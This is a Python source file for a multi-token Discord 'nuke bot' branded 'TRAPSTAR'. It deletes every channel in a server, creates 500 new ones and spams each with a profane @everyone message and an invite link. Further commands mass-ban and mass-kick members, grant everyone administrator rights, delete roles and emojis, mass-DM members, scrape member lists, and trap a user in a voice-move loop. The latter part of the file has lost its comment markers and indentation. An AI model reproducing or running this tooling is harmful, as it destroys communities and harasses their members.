import asyncio
import aiohttp
import discord
from discord.ext import commands
import os
import random

# ------------------------------------------------------------
# Token loader (reads from DISCORD_TOKENS environment variable)
# ------------------------------------------------------------
def load_tokens():
    raw = os.getenv("DISCORD_TOKENS", "")
    if not raw:
        raise RuntimeError("DISCORD_TOKENS environment variable not set.")
    tokens = [t.strip() for t in raw.splitlines() if t.strip()]
    valid = []
    for t in tokens:
        if 50 <= len(t) <= 120 and t.count('.') == 2 and ' ' not in t:
            valid.append(t)
        else:
            print(f"[!] Skipping invalid token: {t[:15]}...")
    if not valid:
        raise ValueError("No valid bot tokens found.")
    print(f"[i] Loaded {len(valid)} token(s).")
    return valid

# ------------------------------------------------------------
# Ultra‑fast HTTP client pool (shared by all bots)
# ------------------------------------------------------------
class HttpClientPool:
    def __init__(self, tokens):
        self.sessions = {}
        for token in tokens:
            connector = aiohttp.TCPConnector(limit=0, force_close=False)
            self.sessions[token] = aiohttp.ClientSession(
                connector=connector,
                headers={
                    "Authorization": f"Bot {token}",
                    "Content-Type": "application/json"
                }
            )

    async def close(self):
        for s in self.sessions.values():
            await s.close()

    async def request(self, token, method, url, **kwargs):
        session = self.sessions[token]
        for _ in range(5):
            async with session.request(method, url, **kwargs) as resp:
                if resp.status == 429:
                    retry_after = float(resp.headers.get("Retry-After", 0.5))
                    await asyncio.sleep(retry_after)
                    continue
                return resp
        return None

# ------------------------------------------------------------
# Dummy rate limiter (unused, but kept for compatibility)
# ------------------------------------------------------------
class GlobalRateLimiter:
    def __init__(self, tokens, max_concurrent=50):
        self.semaphores = {token: asyncio.Semaphore(max_concurrent) for token in tokens}

    async def acquire(self, token):
        await self.semaphores[token].acquire()

    def release(self, token):
        self.semaphores[token].release()

# ------------------------------------------------------------
# Main NukeBot class
# ------------------------------------------------------------
class NukeBot(commands.Bot):
    def __init__(self, token, http_pool, rate_limiter):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents, help_command=None)
        self.own_token = token
        self.http_pool = http_pool
        self.rate_limiter = rate_limiter
        self.all_tokens = list(http_pool.sessions.keys())  # for multi‑token attacks

    async def on_ready(self):
        print(f"[+] Bot {self.user} online.")

    # --------------------------------------------------------
    # Lightspeed NUKE (deletes all channels, creates 500, spams pings)
    # --------------------------------------------------------
    async def nuke(self, guild):
        print(f"[!] Nuking {guild.name}...")

        tokens = self.all_tokens

        # 1. Delete every channel (distributed across all tokens)
        channels = guild.channels
        del_tasks = []
        for i, ch in enumerate(channels):
            token = tokens[i % len(tokens)]
            del_tasks.append(self._delete_channel(token, ch.id))
        await asyncio.gather(*del_tasks, return_exceptions=True)
        print("[+] All channels deleted.")

        # 2. Create up to 500 new channels (max Discord allows)
        sem_create = asyncio.Semaphore(50)  # avoid single‑token flood
        async def create_one(i):
            token = tokens[i % len(tokens)]
            async with sem_create:
                payload = {"name": f"nuked-{i}", "type": 0}
                resp = await self.http_pool.request(token, "POST",
                                                    f"https://discord.com/api/v10/guilds/{guild.id}/channels",
                                                    json=payload)
                if resp and resp.status == 201:
                    data = await resp.json()
                    return data["id"]
                return None

        create_tasks = [create_one(i) for i in range(500)]
        results = await asyncio.gather(*create_tasks, return_exceptions=True)
        new_ids = [cid for cid in results if cid]
        print(f"[+] Created {len(new_ids)} channels.")

        # 3. Spam @everyone message 50 times per new channel
        spam_text = "# Server fucked by trapstar join https://discord.gg/MXEb5Mdy3G @everyone"
        sem_msg = asyncio.Semaphore(200)

        async def spam_channel(ch_id):
            for _ in range(50):
                token = random.choice(tokens)
                async with sem_msg:
                    await self._send_message(token, ch_id, spam_text)

        spam_tasks = [spam_channel(cid) for cid in new_ids]
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        print(f"[+] Ping spam finished in {len(new_ids)} channels.")

    async def _delete_channel(self, token, channel_id):
        url = f"https://discord.com/api/v10/channels/{channel_id}"
        await self.http_pool.request(token, "DELETE", url)

    async def _send_message(self, token, channel_id, content):
        url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
        payload = {"content": content}
        await self.http_pool.request(token, "POST", url, json=payload)

    # --------------------------------------------------------
    # Other commands (all defined as methods, registered below)
    # --------------------------------------------------------
    async def massban(self, ctx):
        guild = ctx.guild
        members = [m for m in guild.members if m != guild.me and guild.me.top_role > m.top_role]
        chunk = 200
        for i in range(0, len(members), chunk):
            batch = members[i:i+chunk]
            payload = {"user_ids": [str(m.id) for m in batch]}
            await self.http_pool.request(self.own_token, "POST",
                                         f"https://discord.com/api/v10/guilds/{guild.id}/bulk-ban",
                                         json=payload)
        await ctx.send(f"Banned {len(members)} members.")

    async def masskick(self, ctx):
        guild = ctx.guild
        tasks = []
        for m in guild.members:
            if m != guild.me:
                tasks.append(self.http_pool.request(self.own_token, "DELETE",
                                                    f"https://discord.com/api/v10/guilds/{guild.id}/members/{m.id}"))
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("Kicked all possible members.")

    async def massunban(self, ctx):
        guild = ctx.guild
        bans = await guild.bans()
        tasks = []
        for ban in bans:
            tasks.append(self.http_pool.request(self.own_token, "DELETE",
                                                f"https://discord.com/api/v10/guilds/{guild.id}/bans/{ban.user.id}"))
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("Unbanned everyone.")

    async def delchannels(self, ctx):
        guild = ctx.guild
        tasks = []
        for ch in guild.channels:
            tasks.append(self._delete_channel(self.own_token, ch.id))
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("All channels deleted.", delete_after=3)

    async def createchans(self, ctx, name, amount: int):
        guild = ctx.guild
        sem = asyncio.Semaphore(50)
        async def create(i):
            token = random.choice(self.all_tokens)
            async with sem:
                payload = {"name": f"{name}-{i}", "type": 0}
                await self.http_pool.request(token, "POST",
                                             f"https://discord.com/api/v10/guilds/{guild.id}/channels",
                                             json=payload)
        tasks = [create(i) for i in range(amount)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send(f"Created {amount} channels.")

    async def renameall(self, ctx, name):
        guild = ctx.guild
        tasks = []
        for ch in guild.channels:
            tasks.append(self.http_pool.request(self.own_token, "PATCH",
                                                f"https://discord.com/api/v10/channels/{ch.id}",
                                                json={"name": name}))
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("Renamed everything.")

    async def nukechannel(self, ctx, channel_id):
        guild = ctx.guild
        await self._delete_channel(self.own_token, int(channel_id))
        await asyncio.sleep(0.5)
        payload = {"name": "nuked", "type": 0}
        resp = await self.http_pool.request(self.own_token, "POST",
                                            f"https://discord.com/api/v10/guilds/{guild.id}/channels",
                                            json=payload)
        if resp and resp.status == 201:
            data = await resp.json()
            new_id = data["id"]
            for _ in range(30):
                await self._send_message(self.own_token, new_id, "GET NUKED @everyone")

    async def spam(self, ctx, amount: int, *, message):
        channel = ctx.channel
        for _ in range(amount):
            await self._send_message(self.own_token, channel.id, message)

    async def webhookspam(self, ctx, webhook_url, amount: int, *, message):
        for _ in range(amount):
            await self.http_pool.request(self.own_token, "POST", webhook_url, json={"content": message})

    async def lockdown(self, ctx):
        guild = ctx.guild
        everyone = guild.default_role
        overwrite = discord.PermissionOverwrite(send_messages=False)
        tasks = [ch.set_permissions(everyone, overwrite=overwrite) for ch in guild.text_channels]
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("Server locked down.")

    async def unlockall(self, ctx):
        guild = ctx.guild
        everyone = guild.default_role
        overwrite = discord.PermissionOverwrite(send_messages=True)
        tasks = [ch.set_permissions(everyone, overwrite=overwrite) for ch in guild.text_channels]
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("Server unlocked.")

    async def massping(self, ctx, amount: int):
        guild = ctx.guild
        role = await guild.create_role(name="PING", mentionable=True)
        for m in guild.members:
            if m != guild.me:
                await m.add_roles(role)
        for ch in guild.text_channels[:5]:
            for _ in range(amount):
                await ch.send(f"{role.mention} @everyone GET PINGED")
        await ctx.send("Mass ping done.")

    async def ghostping(self, ctx):
        for ch in ctx.guild.text_channels:
            msg = await ch.send("@everyone")
            await msg.delete()

    async def delroles(self, ctx):
        guild = ctx.guild
        tasks = []
        for role in guild.roles:
            if role.is_default() or role.managed or role >= guild.me.top_role:
                continue
            tasks.append(self.http_pool.request(self.own_token, "DELETE",
                                                f"https://discord.com/api/v10/guilds/{guild.id}/roles/{role.id}"))
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("Roles deleted.")

    async def createroles(self, ctx, name, amount: int):
        guild = ctx.guild
        sem = asyncio.Semaphore(20)
        async def create(i):
            token = random.choice(self.all_tokens)
            async with sem:
                await self.http_pool.request(token, "POST",
                                             f"https://discord.com/api/v10/guilds/{guild.id}/roles",
                                             json={"name": f"{name}-{i}"})
        tasks = [create(i) for i in range(amount)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send(f"Created {amount} roles.")

    async def massrole(self, ctx, role_name):
        guild = ctx.guild
        role = discord.utils.get(guild.roles, name=role_name)
        if not role:
            return await ctx.send("Role not found.")
        tasks = [m.add_roles(role) for m in guild.members if m != guild.me]
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send(f"Assigned {role_name} to all.")

    async def removerole(self, ctx, role_name):
        guild = ctx.guild
        role = discord.utils.get(guild.roles, name=role_name)
        if not role:
            return await ctx.send("Role not found.")
        tasks = [m.remove_roles(role) for m in guild.members if m != guild.me]
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send(f"Removed {role_name} from all.")

    async def adminall(self, ctx):
        guild = ctx.guild
        role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
        tasks = [m.add_roles(role) for m in guild.members if m != guild.me]
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("Everyone is now admin.")

    async def delemojis(self, ctx):
        for emoji in ctx.guild.emojis:
            await self.http_pool.request(self.own_token, "DELETE",
                                         f"https://discord.com/api/v10/guilds/{ctx.guild.id}/emojis/{emoji.id}")
        await ctx.send("Emojis deleted.")

    async def delstickers(self, ctx):
        for sticker in ctx.guild.stickers:
            await self.http_pool.request(self.own_token, "DELETE",
                                         f"https://discord.com/api/v10/guilds/{ctx.guild.id}/stickers/{sticker.id}")
        await ctx.send("Stickers deleted.")

    async def emojicreate(self, ctx, name, url):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    img = await resp.read()
                    await ctx.guild.create_custom_emoji(name=name, image=img)

    async def massdm(self, ctx, *, message):
        members = [m for m in ctx.guild.members if m != ctx.guild.me and not m.bot]
        tasks = [m.send(message) for m in members]
        await asyncio.gather(*tasks, return_exceptions=True)
        await ctx.send("Mass DM done.")

    async def scrape(self, ctx):
        guild = ctx.guild
        data = {
            "name": guild.name,
            "id": guild.id,
            "channels": {str(c.id): c.name for c in guild.channels},
            "roles": {str(r.id): r.name for r in guild.roles},
            "members": {str(m.id): str(m) for m in guild.members}
        }
        with open(f"scrape_{guild.id}.json", "w") as f:
            import json; json.dump(data, f, indent=2)
        await ctx.send("Scraped data saved to file.")

    async def selfdestruct(self, ctx):
        await ctx.guild.leave()

    async def servericon(self, ctx, url):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    icon = await resp.read()
                    await ctx.guild.edit(icon=icon)

    async def servername(self, ctx, *, name):
        await ctx.guild.edit(name=name)

    async def prune(self, ctx, days: int):
        await ctx.guild.prune_members(days=days)
        await ctx.send("Pruned members.")

    async def invitecreate(self, ctx, amount: int):
        for ch in ctx.guild.text_channels:
            for _ in range(amount):
                await ch.create_invite()
        await ctx.send(f"Created {amount} invites per channel.")

    async def invitedelete(self, ctx):
        invites = await ctx.guild.invites()
        for inv in invites:
            await inv.delete()
        await ctx.send("All invites deleted.")

    async def webhookcreate(self, ctx, channel_id, name):
        channel = self.get_channel(int(channel_id))
        if channel:
            await channel.create_webhook(name=name)
            await ctx.send("Webhook created.")

    async def toggleperms(self, ctx, channel_id, role_id, perms: int):
        channel = ctx.guild.get_channel(int(channel_id))
        role = ctx.guild.get_role(int(role_id))
        if channel and role:
            overwrite = channel.overwrites_for(role)
            new_perms = discord.Permissions(perms)
            overwrite.update(**dict(new_perms))
            await channel.set_permissions(role, overwrite=overwrite)

    async def massreact(self, ctx, channel_id, message_id, emoji):
        channel = self.get_channel(int(channel_id))
        if channel:
            msg = await channel.fetch_message(int(message_id))
            for _ in range(100):
                await msg.add_reaction(emoji)

    async def voicemove(self, ctx, user_id, channel_id):
        member = ctx.guild.get_member(int(user_id))
        channel = ctx.guild.get_channel(int(channel_id))
        if member and channel and member.voice:
            while True:
                await member.move_to(channel)
                await asyncio.sleep(0.5)

    async def help(self, ctx):
        help_msg = """
**🖤 TRAPSTAR NUKE BOT COMMANDS**
```diff
!nuke           → Destroy everything, create 500 channels, spam pings
!massban        → Ban all members
!masskick       → Kick all members
!massunban      → Unban everyone
!delchannels    → Delete all channels
!createchans <name> <amount> → Create channels
!renameall <name> → Rename everything
!nukechannel <id> → Nuke a single channel
!spam <amount> <msg> → Spam current channel
!webhookspam <url> <amount> <msg> → Webhook spam
!lockdown       → Make all channels read-only
!unlockall      → Revert lockdown
!massping <amount> → Ping everyone via role
!ghostping      → Ghost ping @everyone
!delroles       → Delete all roles
!createroles <name> <amount> → Create roles
!massrole <name> → Assign role to all
!removerole <name> → Remove role from all
!adminall       → Give everyone admin
!delemojis      → Delete all emojis
!delstickers    → Delete all stickers
!emojicreate <name> <url> → Create emoji
!massdm <msg>   → DM all members
!scrape         → Save server info
!selfdestruct   → Bot leaves server
!servericon <url> → Change server icon
!servername <name> → Rename server
!prune <days>   → Prune members
!invitecreate <amount> → Create invites
!invitedelete   → Delete all invites
!webhookcreate <ch_id> <name> → Create webhook
!toggleperms <ch_id> <role_id> <perms> → Toggle perms
!massreact <ch_id> <msg_id> <emoji> → React flood
!voicemove <user_id> <ch_id> → Move user forever
"""
await ctx.send(help_msg)

------------------------------------------------------------
Register all commands with the bot
------------------------------------------------------------
def register_commands(bot):

We add commands manually using the function wrappers
@bot.command(name="nuke")
async def nuke_cmd(ctx): await bot.nuke(ctx.guild)

@bot.command(name="massban")
async def massban_cmd(ctx): await bot.massban(ctx)

@bot.command(name="masskick")
async def masskick_cmd(ctx): await bot.masskick(ctx)

@bot.command(name="massunban")
async def massunban_cmd(ctx): await bot.massunban(ctx)

@bot.command(name="delchannels")
async def delchannels_cmd(ctx): await bot.delchannels(ctx)

@bot.command(name="createchans")
async def createchans_cmd(ctx, name, amount: int): await bot.createchans(ctx, name, amount)

@bot.command(name="renameall")
async def renameall_cmd(ctx, name): await bot.renameall(ctx, name)

@bot.command(name="nukechannel")
async def nukechannel_cmd(ctx, channel_id): await bot.nukechannel(ctx, channel_id)

@bot.command(name="spam")
async def spam_cmd(ctx, amount: int, *, message): await bot.spam(ctx, amount, message=message)

@bot.command(name="webhookspam")
async def webhookspam_cmd(ctx, webhook_url, amount: int, *, message): await bot.webhookspam(ctx, webhook_url, amount, message=message)

@bot.command(name="lockdown")
async def lockdown_cmd(ctx): await bot.lockdown(ctx)

@bot.command(name="unlockall")
async def unlockall_cmd(ctx): await bot.unlockall(ctx)

@bot.command(name="massping")
async def massping_cmd(ctx, amount: int): await bot.massping(ctx, amount)

@bot.command(name="ghostping")
async def ghostping_cmd(ctx): await bot.ghostping(ctx)

@bot.command(name="delroles")
async def delroles_cmd(ctx): await bot.delroles(ctx)

@bot.command(name="createroles")
async def createroles_cmd(ctx, name, amount: int): await bot.createroles(ctx, name, amount)

@bot.command(name="massrole")
async def massrole_cmd(ctx, role_name): await bot.massrole(ctx, role_name)

@bot.command(name="removerole")
async def removerole_cmd(ctx, role_name): await bot.removerole(ctx, role_name)

@bot.command(name="adminall")
async def adminall_cmd(ctx): await bot.adminall(ctx)

@bot.command(name="delemojis")
async def delemojis_cmd(ctx): await bot.delemojis(ctx)

@bot.command(name="delstickers")
async def delstickers_cmd(ctx): await bot.delstickers(ctx)

@bot.command(name="emojicreate")
async def emojicreate_cmd(ctx, name, url): await bot.emojicreate(ctx, name, url)

@bot.command(name="massdm")
async def massdm_cmd(ctx, *, message): await bot.massdm(ctx, message=message)

@bot.command(name="scrape")
async def scrape_cmd(ctx): await bot.scrape(ctx)

@bot.command(name="selfdestruct")
async def selfdestruct_cmd(ctx): await bot.selfdestruct(ctx)

@bot.command(name="servericon")
async def servericon_cmd(ctx, url): await bot.servericon(ctx, url)

@bot.command(name="servername")
async def servername_cmd(ctx, *, name): await bot.servername(ctx, name=name)

@bot.command(name="prune")
async def prune_cmd(ctx, days: int): await bot.prune(ctx, days)

@bot.command(name="invitecreate")
async def invitecreate_cmd(ctx, amount: int): await bot.invitecreate(ctx, amount)

@bot.command(name="invitedelete")
async def invitedelete_cmd(ctx): await bot.invitedelete(ctx)

@bot.command(name="webhookcreate")
async def webhookcreate_cmd(ctx, channel_id, name): await bot.webhookcreate(ctx, channel_id, name)

@bot.command(name="toggleperms")
async def toggleperms_cmd(ctx, channel_id, role_id, perms: int): await bot.toggleperms(ctx, channel_id, role_id, perms)

@bot.command(name="massreact")
async def massreact_cmd(ctx, channel_id, message_id, emoji): await bot.massreact(ctx, channel_id, message_id, emoji)

@bot.command(name="voicemove")
async def voicemove_cmd(ctx, user_id, channel_id): await bot.voicemove(ctx, user_id, channel_id)

@bot.command(name="help")
async def help_cmd(ctx): await bot.help(ctx)

------------------------------------------------------------
Cluster launcher
------------------------------------------------------------
async def main():
try:
tokens = load_tokens()
except Exception as e:
print(f"Fatal: {e}")
return

http_pool = HttpClientPool(tokens)
rate_limiter = GlobalRateLimiter(tokens)

bots = []
for token in tokens:
bot = NukeBot(token, http_pool, rate_limiter)
register_commands(bot)
bots.append(bot)

await asyncio.gather(*[bot.start(token) for bot in bots])

if name == "main":
asyncio.run(main())
